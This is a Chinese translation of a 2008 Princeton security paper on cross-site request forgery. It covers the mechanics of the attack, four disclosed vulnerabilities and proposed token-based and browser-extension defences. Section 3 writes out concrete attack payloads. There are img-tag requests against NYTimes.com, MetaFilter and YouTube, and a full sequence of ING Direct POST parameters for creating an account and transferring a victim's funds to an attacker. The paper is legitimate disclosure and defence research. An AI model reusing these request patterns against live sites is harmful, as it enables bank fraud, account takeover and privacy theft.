# 跨站点请求伪造：开发与防范

* 作者：William Zeller/Edward W. Felten
* 单位：普林斯顿大学计算机科学系/普林斯顿大学（伍德罗威尔逊公共与国际事务学院）信息技术中心
* **2008年10月15日修订**：请注意：纽约时报网站已经修复了本文下述漏洞，并说明了我们的服务器端CSRF防御方案**不能**抵御`[17]`中描述的有源攻击。

* 本文的最新版本可以在http://citp.princeton.edu/csrf/ 找到。

## 摘要

当恶意网站导致用户的浏览器在用户信任的网站上执行了非用户授权的操作时，即发生了跨站点请求伪造（CSRF）攻击。这类攻击被称为网络漏洞层面上的“沉睡巨人”，这是因为互联网上的许多网站无法抵御这类攻击，且Web开发与安全社区在很大程度上忽视了这些漏洞。本文阐释了我们在四个重要网站上分别发现的四个严重的CSRF漏洞，其中包括被认为是涉及金融机构的首次公开攻击。这些漏洞使攻击者有利可乘，可实现从用户银行帐户中转账、获取用户电子邮件地址、侵犯用户隐私、对用户帐户造成危害等。本文提出并实现了一些有可能保护网站免受CSRF攻击的基于服务器端的更改方案，并描述了服务器端解决方案应具有的特性（缺少这些特性会触发CSRF防护机制，使正常的网页浏览行为被中断）。此外，我们实现了一个客户端浏览器插件，可在网站未采取自我保护措施的情况下使用户免受特定类型的CSRF攻击。我们希望能为web开发人员提供保护用户免受CSRF攻击的工具，同时提高大众对CSRF攻击的认识。

## 1. 引言

当恶意网站导致用户的浏览器在用户信任的网站上执行了非用户授权的操作时，即发生了跨站点请求伪造`注1`（CSRF）攻击。这类攻击被称为网络漏洞层面上的“沉睡巨人”`[23]`，这是因为互联网上的许多网站无法抵御这类攻击，且web开发和安全社区在很大程度上忽视了这些漏洞。

`注1`：跨站点请求伪造攻击也被称为跨站点引用伪造（*Cross-Site Reference Forgery*）、*XSRF*、会话劫持（*Session Riding*）或混淆代理（*Confused Deputy*）攻击。我们称它CSRF，因为这是这种攻击最常用的术语。

CSRF攻击没有出现在*Web安全威胁分类*`[12]`里，也很少在学术或技术文献中被讨论到`注2`。这种攻击十分容易判断，其利用简单，使用便捷，它们存在的原因是Web开发人员对CSRF攻击的原因和严重性一无所知。Web开发人员还可能误认为针对更广为人知的跨站点脚本（XSS）攻击的防御措施也可以防止CSRF攻击。

`注2`：在ACM数字图书馆中搜索“cross site scripting（跨站点脚本攻击）”（区别于CSRF），结果返回72篇论文，而搜索“xsrf OR csrf”仅返回4篇论文。在Safari电子书网站（收集了4752本技术书籍）上搜索“xss”，发现这个词出现在96本书中，而“csrf OR xsrf”只出现在13本书中。

第3节中提出了我们在四个重要网站上分别发现的四个严重的CSRF漏洞，这些漏洞使攻击者有利可乘，可实现从用户银行帐户中转账、获取用户电子邮件地址、侵犯用户隐私、对用户帐户造成危害等。

第4.1节中提出并实现了一些有可能保护网站免受CSRF攻击的基于服务器端的更改方案，这些方案相比之前提出的解决方案的优势在于，它们不需要服务器状态已知，且不会破坏正常的的网页浏览行为。此外，我们实现了一个客户端浏览器插件，可在网站未采取自我保护措施的情况下使用户免受特定类型的CSRF攻击（4.2节）。

服务器端的防护措施可使网站完全抵御CSRF攻击，同时客户端的防护措施允许用户在未采取自我保护的网站上采取主动方式使自身免受许多类型的CSRF攻击。

## 2. CSRF概览

图1, 2和3显示了CSRF攻击通常是如何工作的。

图1：*这里Web浏览器已经与可信站点建立了认证会话。只有当Web浏览器在经过认证的会话上进行请求时，才能执行可信操作。*

![](img1.png)

图2：*一个有效的请求。Web浏览器试图执行可信操作。可信站点确认Web浏览器已被认证并允许执行该操作。*

![](img2.png)

图3：*CSRF攻击。攻击者站点控制用户的web浏览器向可信站点发送请求。可信站点从Web浏览器中看到有效的、通过身份验证的请求并执行可信操作。CSRF攻击可发生的原因在于，Web站点对Web浏览器进行认证，而非对用户进行认证。* 

![](img3.png)

下面我们用一个具体的例子来更详细地描述CSRF攻击。

### 2.1 一个示例

这里考虑一个易受CSRF攻击的站点的假设示例。该网站是一个基于web的电子邮件网站，允许用户发送和接收电子邮件。该站点使用隐式身份验证（见第2.2节）对其用户进行身份验证。该网站的一个页面是：http://example.com/compose.htm ，其中包含一个HTML窗口，允许用户输入收件人的邮箱地址、邮件主题和内容，还包括一个“发送”按钮。

```html
<form
action="http://example.com/send_email.htm" method="GET">
Recipient’s Email address: <input type="text" name="to">
Subject: <input type="text" name="subject">
Message: <textarea name="msg"></textarea>
<input type="submit" value="Send Email">
</form>
```

当`example.com`这个网站的用户点击了“发送”，他输入的数据将作为GET请求发送到http://example.com/send_email.htm 页面。由于GET请求只是将数据附加到URL，用户输入的数据实际上会被发送到以下URL（假设收件人为“bob@example.com”，邮件主题是“hello”，邮件内容是“提案进行到哪一步了？”）：

```
http://example.com/send_email.htm?to=bob%40example.com&subject=hello&msg=What%27s+the+status+of+that+proposal%3F [注3]
```
`注3`：URL数据被编码，变成`%40`等。

`send_email.htm`页面会获取接收到的数据，并向收件人发送电子邮件。需要注意的是，`send_email.htm`只接受数据，并对该数据执行操作。它不关心请求从何处发起，只关心请求的发出。这意味着如果用户手动输入上述URL到浏览器中，`example.com`仍然会发送电子邮件。例如，如果用户在浏览器中输入了以下三个URL，那么`send_email.htm`将发送三封电子邮件（分别给Bob、Alice和Carol）：

```
http://example.com/send_email.htm?to=bob%40example.com&subject=hi+Bob&msg=test
http://example.com/send_email.htm?to=alice%40example.com&subject=hi+Alice&msg=test
http://example.com/send_email.htm?to=carol%40example.com&subject=hi+Carol&msg=test
```

CSRF攻击可能就在这里发生，因为`send_email.htm`接收所有收到的数据并发送电子邮件。它不验证数据是否来自`compose.htm`。因此，如果攻击者可控制用户浏览器发送请求到`send_email.htm`，则该页面将导致`example.com`代表用户发送包含攻击者选择的任意数据的邮件，这样攻击者就成功地执行了CSRF攻击。

为利用此漏洞，攻击者需要强制用户的浏览器发送请求到`send_email.htm`，以此执行一些恶意操作。（我们假设用户在攻击者的控制下访问一个站点，且该站点无法抵抗CSRF攻击。）特别地，攻击者需要伪造其站点到`example.com`的跨站点请求。不幸的是，HTML提供了许多方法来实现这样的请求。例如`<img>`标签，即使是在URI不是图像的情况下，`<img>`也会导致浏览器加载属性为src的任意URI（因为浏览器在加载URI之后只能识别该URI是图像）。攻击者可创建包含以下代码的页面：

```html
<img src="http://example.com/send_email.htm?to=mallory%40example.com&subject=Hi&msg=My+email+address+has+been+stolen">
```

用户访问该页面时，会自动发送请求到`send_email.htm`，然后一封看起来是该用户发送的邮件会被发送到代码中写道的用户Mallory。这个示例与本文3.1节中描述的我们在纽约时报网站上发现的实际漏洞几乎相同。

当攻击者控制用户的浏览器在另一个站点上执行非用户授权操作时，即发生了CSRF攻击。攻击成功的必要因素是，用户本身有权限执行该操作。CSRF攻击通常与用户有同样的权限，这意味着用户可执行的任何操作，攻击者都可以用CSRF攻击来执行。因此，站点给予用户的权限越大，发生CSRF攻击的可能性就越大。

对于几乎是每一个使用隐式身份验证（参见2.2节）且不具有抵御CSRF攻击的具体措施的站点，CSRF攻击都可成功执行。

同源策略（参见附录B）旨在防止攻击者访问第三方站点上的数据。该策略不阻止发送请求，只防止需要读取从第三方服务器返回的数据这一类的攻击。而CSRF攻击是发送请求的结果，所以同源策略不能防范CSRF攻击。

### 2.2 CSRF与身份验证

CSRF攻击常常利用目标站点的认证机制展开。这个问题的根源在于，Web身份验证通常只能确保站点的请求来自某个确定用户的浏览器；而不能确定用户实际上是否授权了该请求。

举个例子，假设Alice访问一个目标站点*T*，*T*为Alice的浏览器提供一个cookie，其中包含伪随机会话标识`sid`，用于跟踪她的会话。Alice登录该站点，输入了她的有效用户名和密码后，站点记录了Alice已登录的状态。当Alice向*T*发送请求时，浏览器会自动发送包含`sid`的会话cookie。站点T使用该记录识别来自Alice的会话。

现在假设Alice访问了一个恶意站点*M*。*M*提供的内容包含Javascript代码或image标签，该代码或image标签将导致Alice的浏览器向*T*发送HTTP请求。收到请求后，*T*从cookie推断该请求来自于Alice，因此*T*会执行攻击者以Alice的名义请求的操作。这样就成功完成了一次CSRF攻击。

很多其他类型的Web认证机制也会遇到相同的问题。例如，HTTP基础认证机制(HTTP BasicAuth)`[22]`可实现让Alice的浏览器记住在*T*站点上的用户名和密码，将来访问*T*时，浏览器会“帮助”将用户名和密码附加到发送给*T*的请求。或者*T*还可能使用客户端SSL证书来验证身份，但由于浏览器会“帮助”使用证书来发起对*T*站点的请求，因此将导致相同的问题。类似地，若*T*通过IP地址对Alice进行身份验证，CSRF攻击也可能发生。

一般来说，每当隐式地进行身份验证时就有发生CSRF攻击的危险性，因为实际上向哪个站点发送了请求以及请求到底来自哪个浏览器是无法确定的。原则上，这种危险性可以通过要求用户对发送到站点的每个请求采取明确的、不可辩驳的动作（如重新输入用户名和密码）来消除，但在实际应用中这会导致严重的可用性问题。既然连最符合标准、应用最广泛的认证机制都无法抵御CSRF攻击，我们必须到别处去寻求一种实用的解决方案。

### 2.3 CSRF攻击成功的因素

要使攻击成功，用户必须登录到目标站点，并且必须访问攻击者的站点或攻击者有部分控制权的站点。

如果服务器包含CSRF漏洞，并且还接受GET请求（如上面的例子），那么CSRF攻击可以在不利用JavaScript的情况下进行（例如，一个简单的`<img>`标签就可完成）。而如果服务器只接受POST请求，则还需要实现JavaScript自动将POST请求从攻击者的站点发送到目标站点这一步操作。

### 2.4 CSRF和XSS的比较

近来，跨站点脚本（*Cross-Site Scripting*，XSS）`[20]`漏洞受到广泛关注。当攻击者将恶意代码（通常是JavaScript）注入站点，从而将站点的用户作为目标时，就会发生XSS攻击。例如，网站可能允许用户发表评论。这些评论由用户提交，存储在数据库中，并显示给将来访问网站的所有用户。如果攻击者输入恶意JavaScript代码作为注释的一部分，则JavaScript将嵌入到包含该注释的所有页面上。当用户访问该站点时，攻击者的JavaScript将拥有该站点的所有权限。嵌入在该站点中的恶意JavaScript能够发送和接收来自站点上任何页面的请求，并访问该站点设置的cookie。抵御XSS攻击需要站点谨慎地过滤所有用户的输入以确保没有恶意代码被注入。

CSRF和XSS攻击的不同之处在于XSS攻击需要注入JavaScript，而CSRF攻击不需要。XSS攻击要求站点接收恶意代码，而CSRF攻击要求恶意代码位于第三方站点上。过滤用户的输入可防止恶意代码在特定站点上运行，却不能阻止恶意代码在第三方站点上运行。由于恶意代码可以在第三方站点上运行，所以抵御XSS攻击的措施并不能抵御CSRF攻击。若一个站点易受XSS攻击，那么它也很容易受到CSRF攻击。若一个站点可完全抵御XSS攻击，它*仍很可能*遭受CSRF攻击。

## 3 CSRF漏洞举例

这一节中描述了我们发现的四个漏洞。这些攻击事件是通过查询一个包含十大热门网站的榜单发现的。我们分析的这些站点要么具有CSRF漏洞，要么具有漏洞历史（自站点漏洞被修复时起，web搜索将显示CSRF漏洞的报告）。在第三方发现问题之前，许多站点都容易受到CSRF攻击，这一事实表明许多站点管理员对CSRF漏洞本身及其风险缺乏了解。 

ING Direct、Metaﬁlter、YouTube以及纽约时报这四个站点已经修复了我们下文描述的漏洞，而它们似乎都使用了类似于4.1节中提出的方法来解决。

### 3.1 纽约时报网站（nytimes.com）

*纽约时报网站是“网络上最大的报纸网站”*`[10]`。

我们在NYTimes.com中发现了一个CSRF漏洞，它使攻击者可使用用户的电子邮箱地址发信。如果您是NYTimes.com的用户，则一些网站可以利用该漏洞来确定您的电子邮件地址，并使用它进行垃圾邮件发送或识别您的身份等操作。

这种攻击利用了NYTimes.com的“以电子邮件分享”这一功能，该功能允许用户通过填写收件人的邮箱地址和可选的个人信息等来发送NYTimes.com上的文章的链接。收件人会收到一封看起来像是这样的邮件：

```
【用户邮箱地址】发送给您此页面
来自发送者的信息: 我想你可能对这个感兴趣。
美国国家信息局
标题：研究人员发现了窃取加密数据的方法
作者：JOHN MARKOFF
一个计算机安全研究小组开发了一种从计算机硬盘中窃取加密信息的方法。 
```

为利用此漏洞，攻击者控制用户浏览器向NYTimes.com发送“以电子邮件分享”的请求。而该站点无法抵御CSRF攻击，所以将导致用户浏览器发送邮件到攻击者指定的地址。若攻击者将收件人地址设置为自己的邮箱地址，他就会接收到包含该用户邮箱地址的邮件。

开发这个漏洞非常简单。NYTimes.com上的每篇文章都有跳转到“以电子邮件分享”页面的选项，该页面包含一个要求用户输入收件人邮箱地址的窗口。该窗口还包含一些隐藏的变量，这些变量对于每篇文章都是唯一的。下面是一个示例：

```html
<form
action="http://www.NYTimes.com/mem/emailthis.html"
method="POST"
enctype="application/x-www-form-urlencoded">
<input type="checkbox" id="copytoself" name="copytoself" value="Y">
<input id="recipients" name="recipients" type="text" maxlength="1320" value=""> 
<input type="hidden" name="state" value="1"> 
<textarea id="message" name="personalnote" maxlength="512"></textarea>
<input type="hidden" name="type" value="1"> 
<input type="hidden" name="url" value="[...]">
<input type="hidden" name="title" value="[...]"> 
<input type="hidden" name="description" value="[...]">
... 
</form>
```

由于NYTimes.com未区分GET请求和POST请求，因此攻击者可以将该窗口转换为GET请求，供稍后在`<img>`标签中使用。将窗口转换为GET请求需要将每个参数附加到URL的查询字符串中（形式为`NAME=VALUE`，用"&"号分隔）。

攻击者构造了URL后，可将其设置为`<img>`标记的src属性。若登录NYTimes.com的用户访问包含这个`<img>`标签的任意页面，浏览器就会加载带有攻击者参数的“以电子邮件分享”页面，导致NYTimes.com向攻击者发送包含用户邮箱地址的邮件。攻击者可保存此邮箱地址进而滥用（如用于垃圾邮件）或使用该地址来标识攻击者的站点的访问者。这可能带来严重的隐私泄露问题，如允许有争议的网站（涉及政治或违法等）的经营者识别他们的用户等。

*笔者在Firefox 2.0.0.6、Opera 9.23和Safari 3.0.3（522.15.5）中验证了这种攻击。由于附录A中描述的原因，攻击在IE浏览器中不起作用。我们在2007年9月向《纽约时报》报告了这一漏洞。截至2008年10月1日，漏洞已被修复。*

### 3.2 ING Direct(ingdirect.com)

*“ING DIRECT是美国第四大储蓄银行，资产超过620亿美元，为410多万客户提供了优质的储蓄和抵押服务。”* `[15]`

在ING站点中发现的CSRF漏洞允许攻击者以用户名义打开其帐户，并将资金从用户帐户转移到攻击者自己的帐户。正如我们在第2.2节中讨论的，ING的SSL并不阻止这种攻击。这是首次利用CSRF发起的涉及金融机构的攻击。由于ING没有能抵御CSRF攻击的具体措施，攻击者从用户帐户转移出资金与用户自己转移资金时采取的步骤一样简单。这些步骤包括以下动作：

1. 攻击者以用户名义创建一个活期存款帐户`注4`

    `注4`：ING Direct允许用户在初始金额任意的情况下立即创建活期存款账户。

    (a)攻击者控制用户浏览器访问ING站点的“创建新账户”页面
    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html?command=gotoOpenOCA 的GET请求。

    (b)攻击者控制用户浏览器选择“独立”账户

    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html 的POST请求，其中包括这些属性：
        ```
        command=ocaOpenInitial&
        YES, I WANT TO CONTINUE..x=44&
        YES, I WANT TO CONTINUE..y=25
        ```

    (c)攻击者选择任意数量的资金从用户最初的储蓄账户转移到新的欺诈账户：
    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html 的POST请求，其中包括这些属性：
        ```
        command=ocaValidateFunding&
        PRIMARYCARD=true&
        JOINTCARD=true&
        Account Nickname=[ACCOUNT_NAME]&
        FROMACCT= 0&
        TAMT=[INITIAL_AMOUNT]&
        YES, I WANT TO CONTINUE..x=44&
        YES, I WANT TO CONTINUE..y=25&
        XTYPE=4000USD &XBCRCD=USD
        ...
        ```
        其中`[ACCOUNT_NAME]`是新的欺诈账户，`[INITIAL_AMOUNT]`是在账户建好后将被转账到新账户的资金数目。帐户名称可以是任何字符串，且攻击者不需要事先知道——它只是一个用于新帐户的昵称。

    (d)攻击者控制用户浏览器点击最后的“创建新账户”按钮，使ING Direct为用户新建一个活期存款账户。
    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html 的POST请求，其中包括这些属性：
        ```
        command=ocaOpenAccount&
        Agree ElectronicDisclosure=yes&
        AgreeTerms Conditions=yes&
        YES, I WANT TO CONTINUE..x=44&
        YES, I WANT TO CONTINUE..y=25&
        YES, I WANT TO CONTINUE.=Submit
        ```
2. 攻击者将自己作为收款人添加到用户帐户中。

    (a)攻击者控制用户浏览器浏览“添加收款人”页面：
    * 发起对   https://secure.ingdirect.com/myaccount/INGDirect.html?command=goToModifyPersonalPayee&Mode=Add&from=displayEmailMoney 的GET请求。

    (b)攻击者控制用户浏览器浏览填写攻击者信息的页面：
    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html 的POST请求，其中包括这些属性：
        ```
        command=validateModifyPersonalPayee&
        from=displayEmailMoney&
        PayeeName =[PAYEE_NAME]&
        PayeeNickname=&chk Email=on&
        PayeeEmail=[PAYEE_EMAIL]&
        PayeeIsEmailToOrange=true&
        Payee OrangeAccount=[PAYEE_ACCOUNT_NUM]&
        YES, I WANT TO CONTINUE..x=44&
        YES, I WANT TO CONTINUE..y=25
        ```
        其中`[PAYEE_NAME]`是攻击者姓名，`[PAYEE_EMAIL]`是攻击者邮箱，`[PAYEE_ACCOUNT_NUM]`是攻击者的ING账户号码。

    (c)攻击者控制用户浏览器确认攻击者是有效的收款人：
    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html 的POST请求，其中包括这些属性：
        ```
        command=modifyPersonalPayee&
        from= displayEmailMoney&
        YES, I WANT TO CONTINUE..x=44&
        YES, I WANT TO CONTINUE..y=25
        ```
3. 攻击者将资金从用户帐户转移到自己的帐户。

    (a)攻击者控制用户浏览器输入转账金额
    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html 的POST请求，其中包括这些属性：
        ```
        command=validateEmailMoney&
        CNSPayID =5000&
        Amount=[TRANSFER_AMOUNT]&
        Comments=[TRANSFER_MESSAGE]&
        YES, I WANT TO CONTINUE..x=44&
        YES, I WANT TO CONTINUE..y=25&
        show=1&
        button=Send Money
        ```
        其中`[TRANSFER_AMOUNT]`是转账的资金金额，`[TRANSFER_MESSAGE]`是转账时的附加信息。

    (b)攻击者控制用户浏览器确认转账金额：
    * 发起对 https://secure.ingdirect.com/myaccount/INGDirect.html 的POST请求，其中包括这些属性：
        ```
        command=emailMoney&
        Amount= [TRANSFER_AMOUNT]
        Comments= [TRANSFER_MESSAGE]&
        YES, I WANT TO CONTINUE..x=44&
        YES, I WANT TO CONTINUE..y=25
        ```
        其中`[TRANSFER_AMOUNT]`和`[TRANSFER_MESSAGE]`含义同3(a)中对应字段。

为使攻击成功，攻击者将创建一个页面，该页面使用JavaScript连续发出上述POST请求。这对用户来说是不可见的。 

此次攻击的前提是用户的ING Direct活期存款账户未曾添加其他收款人。而这类攻击很可能已经升级了，在没有这种限制的情况下也能进行。

*笔者只在Firefox 2.0.0.3和IE浏览器 7.0.5中验证了这类攻击，未在其它浏览器中进行测试。我们已经告知了ING Direct这个漏洞，且漏洞已经被修复了。*

### 3.3 MetaFilter(metaﬁlter.com) 

*“MetaFilter是一个博客平台，任何人都可以在上面添加链接或评论。”它目前拥有5万多个用户，每个月有超过350万独立访客*`[1]`。 

我们在MetaFilter中发现了可供攻击者控制用户帐户的CSRF漏洞。 

MetaFilter有一个“忘记密码”页面`[6]`，允许用户找回密码。输入用户名会触发MetaFilter向该用户绑定的邮箱地址发送包含用户当前密码的电子邮件。这意味着，若攻击者能更改用户绑定的邮箱地址，就可以利用“忘记密码”页面来接收用户的密码，进而控制用户的帐户。

这里发现的CSRF攻击允许攻击者对用户绑定的邮箱地址进行更改。为使攻击成功，攻击者将控制用户浏览器向用于更新用户配置文件的页面发送请求。此页面接受用户的邮箱地址作为参数，这里可用攻击者的邮箱地址来替换。一个示例攻击是像这样嵌入在页面上的HTML：

```html
<img src=" http://metafilter.com/contribute/customize_action.cfm?user_email=[ATTACKER’S EMAIL]"/>
```

虽然攻击者可更改任意登录用户绑定的邮箱地址，但他不知道具体修改了哪个用户的帐户。然而攻击者可利用MetaFilter的另一个功能来获知，该功能允许用户将其他用户标记为“联系人”。攻击者可利用与上述CSRF攻击类似的方法使用户在不知不觉中将攻击者添加到其联系人列表。

*笔者在Firefox 2.0.0.6中验证了这个攻击。由于附录A中描述的原因，该攻击在IE浏览器中不起作用。在其他浏览器中未进行测试。我们向MetaFilter报告了此漏洞，并确认了该漏洞在两天内已被修复。*

### 3.4 YouTube(youtube.com) 

*“YouTube是网络视频的领导者，也是通过网络观看和分享全球原创视频的首要平台”`[13]`。2006年6月的一项研究发现，“仅YouTube就占据了大约20%的HTTP流量，或者说几乎10%的互联网流量。”`[14]`*

我们发现用户在YouTube上执行的几乎每个动作都包含CSRF漏洞。利用这些漏洞，攻击者可将视频添加到用户的“收藏夹”、将自己添加到用户的“朋友”或“家庭”列表，以用户名义发送任意消息、将视频标记为不恰当的、自动与用户的联系人共享视频、使用户订阅某“频道”。（一系列由一个人或组发布的视频）或是将视频添加到用户的“快速访问列表”（用户打算稍后观看的视频列表）。例如，为了添加视频到用户的“收藏夹”，攻击者只需要在任意站点上嵌入这个`<img>`标签：
```html
<img src="http://youtube.com/watch_ajax?action_add_favorite_playlist=1&video_id=[VIDEO_ID]&playlist_id=&add_to_favorite=1&show=1&button=AddvideoasFavorite"/>
```
攻击者可能会利用这个漏洞来影响视频的流行指数。例如，如果使数量众多的用户添加一个视频到他们的“收藏夹”中，YouTube就会在“热门收藏夹”中显示该视频（被“收藏”次数最多的视频列表）。除了增加视频的流行指数外，攻击者还可能使用户在不知情情况下将视频标记为不恰当的，试图使YouTube将其从网站上删除。

这些攻击手段也可被用于侵犯用户隐私。YouTube允许用户只给朋友或家人分享视频。这些攻击使攻击者可将自己添加到用户的“朋友”或“家庭”列表中，这意味着他可以访问用户上传的仅这些列表可见的所有私有视频。

攻击者可能与用户的整个联系人列表（“朋友”、“家人”等）共享视频。“共享”意味着发送一个带有附加信息的视频链接。此信息可以包括其它外链，这意味着攻击者可以强制在其中添加攻击站点的链接。接收到该消息的用户可能点击此链接，从而使攻击像病毒一样传播。

*笔者在Firefox 2.0.0.6中验证了这些攻击。由于附录A中描述的原因，该攻击在IE浏览器中无法生效。在其他浏览器中未进行测试。我们向YouTube报告了这些漏洞，看起来漏洞已经被修复了。*

## 4 如何抵御CSRF攻击

我们创建了两个工具，可保护大部分用户免受CSRF攻击。第一个工具是基于服务器端的，它能帮助有可能受到攻击的站点完全抵御CSRF攻击。第二个工具是基于客户端的，它可以帮助用户抵御某些类型的CSRF攻击。表1精确地描述了用户在什么情况下可以受到这些不同技术的保护。我们在下文中还推荐了服务器端解决方案应具有的一些特性。这些推荐特性比之前已被提出的方案更有优势，因为它们不需要服务器状态已知，也不会干扰正常的网页浏览行为。

表1：用户保护机制

|  |未受保护的用户|使用我们的Firefox插件的用户|
|-|-|-|
|未受保护的目标网站|不受保护|不受保护|
|只能接受POST请求的目标网站|不受保护|受保护|
|采取了服务器端防护措施的目标网站|受保护|受保护|

*该表显示了用户何时不受CSRF防御机制的保护。我们的建议是服务器端应做到保护网站的每一位用户。当服务器需要使用POST请求时，可使用我们的客户端浏览器插件保护用户。*

### 4.1 服务器端的防御措施

**注意**：下面我们假设攻击者无法修改用户与目标站点交互的cookie。在攻击者不属于有源网络攻击者的情况下，同源策略可使该假设成立。下面的解决方案不能抵御有源网络攻击（详细信息参见`[17]`）。

近来许多框架被引入用于简化各种语言的Web开发。示例有Code Igniter`[4]`（PHP）、Rubyon Rails`[8]`（Ruby）、django`[5]`（Python）、Catalyst`[3]`（Perl）以及Struts`[9]`（Java）。这些框架的一个主要优点是，可直接在框架上建立CSRF抵御机制从而保护开发人员，同时使他们无需自己实现防护机制。在框架级别实施的CSRF抵御机制将得到更大的监督力度和更低的由于粗心大意或是对CSRF的误解而引入漏洞的几率。

通过采取以下预防措施，独立站点和框架可抵御CSRF攻击：

1. **只允许GET请求*检索*数据，不允许修改服务器上的任何数据**

    这里利用`<img>`标签或其他类型的GET请求抵御受CSRF攻击。此外，此方案遵循RFC 2616协议（HTTP／1.1）：

    需要注意的是，惯例是GET和HEAD方法**不应该**具有除检索之外的其他动作。这些方法应该被认为是“安全”的`[21]`。

    虽然这种保护机制无法独立抵御CSRF（攻击者可以使用POST请求），但它与方法（2）组合可完全防止CSRF漏洞。`注5`

    `注5`：我们假设攻击者无法修改用户的cookies。

2. **要求所有POST请求包含伪随机值**

    当用户访问站点时，站点应该生成（保密性强的）伪随机值，并将其设置为用户的cookie。站点应要求每个窗口提交操作都包含该伪随机值作为窗口值以及cookie值。若站点接收到POST请求，仅当窗口值与Cookie值相同时，才认为该请求有效。当攻击者以用户名义提交一个窗口时，他只能修改窗口值。根据*同源*策略（参见附录B），这时攻击者不能读取服务器端发送的任何数据或是修改cookie值。这意味着，虽然攻击者可以随窗口发送他选择的任何信息，但是他无法修改或读取cookie值。因为cookie值和窗口值必须相同，除非攻击者能猜测到正确的伪随机值，否则他无法成功提交窗口。

3. **使用与用户帐户无关联的伪随机值**

    与用户帐户有关联的伪随机值无法抵御`[17]`中描述的“登录（Login）CSRF”攻击。

这种在服务器端进行防护的形式具有以下特点：

* **轻量级**。本方案不需要服务器端状态已知。站点的唯一职责是生成一个伪随机值（当前不存在时），并在接收到POST请求时比较两个值，这使得这种形式的CSRF防护在计算上成本低。

* **并行会话兼容**。若一个用户打开了一个站点的两个不同窗口，那么CSRF防护机制应阻止他同时成功提交这两个窗口。考虑一下，若站点在每次加载窗口时生成一个伪随机值而覆盖了旧的伪随机值，会发生什么？用户只能成功提交打开的最后一个窗口，因为所有其他窗口都包含无效的伪随机值。这里还必须注意确保CSRF防护机制不会破坏浏览器的多选项卡式浏览或使用多个浏览器窗口访问站点的行为。本方案通过设置全站点范围内的cookie并在一定时间内对所有窗口使用相同的cookie来解决这个问题。

* **认证未知身份用户**。本方案无需使用特殊类型的认证。cookie会话、HTTP认证、SSL认证或IP地址均可用于验证用户身份。 

使用伪随机值的方法之前已被提出过，但其中许多方案不具备上述特征。例如，Johns and Winter`[24]`和Schreiber`[27]`需要服务器状态已知，而Shiett`[28]`中断了多选项卡式浏览。据我们所知，之前提出的解决方案未强调确保正常浏览行为的重要性。

任何可拦截POST请求并阻止使用“封装（wraps）”命令来生成`<form>`标签的框架都可以将上述CSRF防护机制透明地构建到框架中。例如，如果框架要求开发人员调用函数`form open(...)`来生成`<form...>`标签，那么可以对框架进行调整，使其在每次创建窗体时自动生成伪随机值：

```html
<form ...> 
<input type="hidden" name="csrf_value"
value="8dcb5e56904d9b7d4bbf333afdd154ca"> 
```

此外，该框架可以处理设置相关的cookie值，并将用户提交的值与cookie值进行比较。如果一个框架添加了这种CSRF防护机制，那么该框架的所有用户都将受到保护。由于这种CSRF防护机制是轻量级的，且框架或开发人员可能提供的身份验证方法未知，因此我们强烈建议使用可拦截POST请求和阻止生成`<form>`标签的框架来实现这种CSRF防护机制，并将其设置为默认选项。框架也应该为开发人员提供禁用此防护机制的选择，比如这些情况下时：开发人员自己实现了CSRF防护又或是他们不希望使用cookie。

我们为Code Igniter框架提供了一个这样的插件。该插件不需要开发人员修改现有的任何窗口，且会拦截POST请求（并验证其伪随机值）和调用`<form>`标签的函数。该插件还提供了一个函数，允许将CSRF令牌（tokens）添加到AJAX请求，尽管这需要开发人员干预（Code Igniter没有执行AJAX请求的默认方法）。该插件可以从我们的网站下载。`注6`

`注6`：我们的Code Igniter插件下载地址：http://www.cs.princeton.edu/˜wzeller/csrf/ci/

`译者注`：`注6`与`注7`提供的下载地址均已失效。

### 4.2 客户端的防御措施

Web浏览器发送的请求给攻击者提供了成功执行CSRF攻击的机会，因此我们可以创建客户端工具来抵御这些攻击。一个现有的工具*RequestRodeo* `[24]`可通过充当客户端和服务器之间的代理来有效抵御攻击。若*RequestRodeo*看到它认为无效的请求，它将从请求中剔除身份认证信息。虽然这在很多情况下是有效的，但它也有一些局限性。特别是，当使用客户端SSL认证，或者使用JavaScript来生成页面部分内容时（因为*RequestRodeo*是在数据传送到代理之时、浏览器显示数据之前的过程中分析数据），*RequestRodeo*将无法生效。

我们开发了一个浏览器插件，它将保护用户免受某些类型的CSRF攻击并克服上述限制。该插件可作为Firefox浏览器的一个扩展包使用。用户需要下载并安装此扩展包以便有效地抵抗CSRF攻击。

该扩展包拦截每个HTTP请求并决定是否允许它工作。这个决定遵循下面的规则。第一，允许除POST请求之外的所有请求。第二，如果发起请求的站点和目标站点遵循同源策略（参见附录B），则允许该请求。第三，如果发起请求的站点使用Adobe的跨域策略(*cross-domain policy*)（参见附录B）向目标站点发出请求，则允许该请求。若我们的扩展包拒绝了一个请求，则使用一个安全接口（与Firefox的弹出式拦截器使用的接口相同）警告用户该请求已被拦截，同时也提供给用户将站点添加到白名单的选项。

该扩展包只拦截POST请求。这意味着它不能抵御使用GET请求发起的CSRF攻击。抵御这种类型的攻击仅有的方法是禁止跨域(*cross-domain*)的GET请求或是只允许用户一次登录到一个站点，然而这些限制可能会给用户带来严重的可用性问题。 

此Firefox扩展包可在我们的网站上下载。`注7`

`注7`：我们的Firefox扩展包下载地址：http://www.cs.princeton.edu/˜wzeller/csrf/protector/

## 5 相关工作

已公开披露的CSRF攻击手段主要是源于OmniTI公司的Chris Shiett`[28]`和WhiteHat Security公司的Jeremiah Grossman`[23]`的工作。Burns`[19]`和Sreiber`[27]`对CSRF攻击提供了全面的介绍，但是没有描述目前存在的漏洞。Johns和Winter`[24]`介绍了*RequestRodeo*，这是一种使用HTTP代理抵御CSRF攻击的客户端保护手段。这种方法存在一些限制，同时他们介绍了一个与我们类似的浏览器插件作为未来可能的工作方向。他们在`[25]`中扩展了这项工作，实现了一个受限局域网(*restricted local network*)，用于抵御CSRF对本地资源的攻击。

